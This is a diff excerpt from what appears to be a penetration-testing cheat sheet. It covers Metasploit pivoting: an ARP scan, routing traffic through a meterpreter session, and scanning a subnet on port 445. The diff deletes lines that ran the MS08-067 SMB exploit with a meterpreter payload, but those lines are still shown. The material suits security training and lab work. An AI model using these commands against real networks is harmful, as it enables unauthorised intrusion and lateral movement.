@@ -259,16 +259,13 @@ run arp_scanner -r 10.10.10.1/24
 
 meterpreter > background
 route add 10.0.0.1 255.255.255.0 x            Where x is the meterpreter session ID.
-route print
+route print                                   Verify the new route.
+
 use auxiliary/scanner/portscan/tcp
-set RHOSTS 10.0.0.20
-set PORTS 1-200
-set THREADS 255
-exploit
-use exploit/windows/smb/ms08_067_netapi
-set RHOST 10.0.0.20
-set PAYLOAD windows/meterpreter/bind_tcp
-exploit
+set RHOSTS 10.0.0.0/24
+set PORTS 445
+set THREADS 10
+run
 ------------------------------------------------------------------------------------------------------
 
 # msfvenom
